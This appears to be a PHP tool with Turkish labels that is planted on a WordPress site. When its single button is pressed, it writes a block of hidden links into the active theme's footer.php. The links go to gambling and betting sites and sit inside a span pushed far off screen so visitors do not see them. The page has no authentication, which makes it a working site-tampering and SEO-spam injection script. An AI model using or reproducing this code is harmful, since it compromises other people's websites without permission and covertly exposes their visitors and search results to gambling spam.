<?php
// Hata raporlamasını açalım
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

// WordPress'i yükle
if (file_exists('../wp-load.php')) {
    require_once('../wp-load.php');
} elseif (file_exists('../../wp-load.php')) {
    require_once('../../wp-load.php');
} else {
    die("WordPress yüklenemedi.");
}

// Backlink ekleme işlemi
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    ob_start(); // Çıktıyı yakalamaya başla

    try {
        // Eklenecek backlink kodu
        $backlinkCode = '<span style="position: absolute; left: -9655px;">
<a href="https://romabet.cam/">روما بت</a><br>
<a href="https://mahbet.cam/">ماه بت</a><br>
<a href="https://pinbahis.com.co/">پین باهیس</a><br>
<a href="https://bettingmagazine.org/">بهترین سایت شرط بندی</a><br>
<a href="https://1betcart.com/">بت کارت</a><br>
<a href="https:// yasbet.com.co/">یاس بت</a><br>
<a href="https://yekbet.cam/">یک بت</a><br>
<a href="https://megapari.cam/">مگاپاری </a><br>
<a href="https://onjabet.net/">اونجا بت</a><br>
<a href="https://alvinbet.org/">alvinbet.org</a><br>
<a href="https://2betboro.com/">بت برو</a><br>
<a href="https://betfa.cam/">بت فا</a><br>
<a href="https://betforward.help/">بت فوروارد</a><br>
<a href="https://1xbete.org/">وان ایکس بت</a><br>
<a href="https://1win-giris.com.co/">1win giriş</a><br>
<a href="https://betwiner.org/">بت وینر</a><br>
<a href="https://4shart.com/">بهترین سایت شرط بندی ایرانی</a><br>
<a href="https://1xbetgiris.cam">1xbet giriş</a><br>
<a href="https://1kickbet1.com/">وان کیک بت</a><br>
<a href="https://winbet-bet.com/">وین بت</a><br>
<a href="https://ritzobet.org/">ریتزو بت</a><br></span>';

        // Mevcut temayı al
        $currentTheme = wp_get_theme();
        $themeDir = get_template_directory();
        
        echo "Mevcut tema: " . $currentTheme->get('Name') . "\n";
        echo "Tema dizini: " . $themeDir . "\n";

        // footer.php dosyasının yolu
        $footerPath = $themeDir . '/footer.php';

        echo "footer.php dosya yolu: $footerPath\n";
        echo "Dosya var mı?: " . (file_exists($footerPath) ? 'Evet' : 'Hayır') . "\n";
        echo "Dosya okunabilir mi?: " . (is_readable($footerPath) ? 'Evet' : 'Hayır') . "\n";
        echo "Dosya yazılabilir mi?: " . (is_writable($footerPath) ? 'Evet' : 'Hayır') . "\n";

        if (!file_exists($footerPath)) {
            throw new Exception("footer.php dosyası bulunamadı: $footerPath");
        }

        if (!is_readable($footerPath)) {
            throw new Exception("footer.php dosyası okunamıyor: $footerPath");
        }

        if (!is_writable($footerPath)) {
            throw new Exception("footer.php dosyası yazılamıyor: $footerPath");
        }

        // Dosya içeriğini oku
        $fileContents = file_get_contents($footerPath);
        
        if ($fileContents === false) {
            throw new Exception("Dosya okunamadı: $footerPath");
        }

        // Backlink zaten var mı kontrol et
        if (strpos($fileContents, $backlinkCode) === false) {
            // </body> etiketinden önce backlink'i ekle
            $newContents = str_replace('</body>', $backlinkCode . "\n</body>", $fileContents);
            
            // Dosyayı yeni içerikle yaz
            if (file_put_contents($footerPath, $newContents) === false) {
                throw new Exception("Dosyaya yazma hatası: $footerPath");
            }
            
            echo "Backlink başarıyla eklendi: $footerPath\n";
        } else {
            echo "Backlink zaten mevcut: $footerPath\n";
        }

    } catch (Exception $e) {
        echo "Hata: " . $e->getMessage() . "\n";
    }

    $output = ob_get_clean(); // Çıktıyı yakala ve temizle
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>WordPress Tema footer.php Backlink Ekleme</title>
</head>
<body>
    <h1>WordPress Tema footer.php Backlink Ekleme Aracı</h1>
    <form method="post">
        <button type="submit">EKLE</button>
    </form>
    <?php if (isset($output)): ?>
        <h2>İşlem Sonucu:</h2>
        <pre><?php echo htmlspecialchars($output); ?></pre>
    <?php endif; ?>
</body>
buradayim
</html>
